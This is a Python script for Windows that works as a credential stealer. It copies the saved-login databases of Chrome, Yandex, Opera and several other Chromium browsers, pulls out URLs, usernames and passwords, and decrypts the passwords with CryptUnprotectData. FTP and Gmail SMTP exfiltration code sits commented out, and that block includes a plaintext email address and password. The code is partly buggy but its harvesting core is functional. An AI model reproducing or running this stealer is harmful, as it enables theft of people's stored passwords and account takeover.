
from os.path import expanduser
from sqlite3 import connect
from ftplib import FTP_TLS
from re import findall
import sys, random
import os
import smtplib
from tkinter import *
from win32crypt import CryptUnprotectData
#sys.setdefaultencoding('utf-8')
import base64
def main():	
	pathusr         = expanduser('~')
	#vivaldi         = pathusr + r'/AppData/Local/Vivaldi/User DataDefault/Login Data'
	chrome          = pathusr + r'/AppData/Local/Google/Chrome/User Data/Default/Login Data'
	yandex          = pathusr + r'\AppData\Local\Yandex\YandexBrowser\User Data\Default\Login Data'
	opera           = pathusr + r'\AppData\Roaming\Opera Software\Opera Stable\Login Data'
	kometa          = pathusr + r'\AppData\Local\Kometa\User Data\Default\Login Data'
	orbitum         = pathusr + r'\AppData\Local\Orbitum\User Data\Default\Login Data'
	comodo          = pathusr + r'\AppData\Local\Comodo\Dragon\User Data\Default\Login Data'
	amigo           = pathusr + r'\AppData\Local\Amigo\User\User Data\Default\Login Data'
	torch           = pathusr + r'\AppData\Local\Torch\User Data\Default\Login Data'
	print(pathusr)
	databases       = [chrome, yandex, opera, kometa, orbitum, comodo, amigo, torch]
	coped_db        = pathusr + '''\AppData\Logins'''
	file_with_logs  = pathusr + '''\AppData\Local\Temp\Logins.txt'''



	#ftp = FTP_TLS()
	#ftp.set_debuglevel(2)
	#ftp.connect(server, 21)
	#ftp.sendcmd('USER ' + str(user))
	#ftp.sendcmd('PASS ' + str(pasd))
	#smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
	#smtpObj.starttls()
	#smtpObj.ehlo()
	#smtpObj.login('artur.2002.artur@gmail.com', 'Wasd123was')
	with open('hello.txt', 'w' ) as f:
		for db in databases:
			try:
				source = open(db, 'r')
				source.close()
				source_size = os.stat(db).st_size
				copied = 0
				source = open(db, 'rb')
				target = open(coped_db, 'wb')
				while True:
					chunk = source.read(32768)
					if not chunk:
						break
					target.write(chunk)
					copied += len(chunk)
					
				source.close()
				target.close()

				con = connect(coped_db)
				cursor = con.cursor()

				cursor.execute("SELECT origin_url, username_value, password_value from logins;")
				
				var_with_logs = ''
				for log in cursor.fetchall():
					#print(log[2])
					#print(log[2], '\n\n\n\n')
					#print(CryptUnprotectData(log[2]))
					var_with_logs += str('URL: ' + log[0] + '\n')
					var_with_logs += str('Login : ' + log[1]  + '\n')
					var_with_logs += str('Password : ')



				print(var_with_logs, '\n',CryptUnprotectData(log[2])[1], '\n\n\n')
				with open("result", "w") as f:
					pass
			except Exception as e:
				print(e)


if __name__ == '__main__':
	main()